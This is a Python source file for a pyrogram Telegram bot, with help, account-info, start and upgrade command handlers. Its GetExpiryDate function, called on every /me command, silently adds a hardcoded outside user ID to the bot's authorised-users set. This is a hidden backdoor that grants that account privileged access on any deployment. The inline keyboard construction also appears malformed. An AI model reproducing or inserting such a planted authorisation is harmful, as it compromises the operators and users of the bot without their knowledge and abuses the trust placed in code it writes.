#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram import StopPropagation

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(1305002856)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["starting"]))
async def start(bot, update):
    # logger.info(update)
    await update.reply(f"<b>Hii {update.chat.first_name}!</b>\nThis is a Telegram Multipurpose Bot Which can do many functions. /help for more details...  ",reply_markup=InlineKeyboardMarkup(
            [
                    InlineKeyboardButton('JOIN', url='https://t.me/TGBotsCollection')
                ]
        )
    )
      

@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
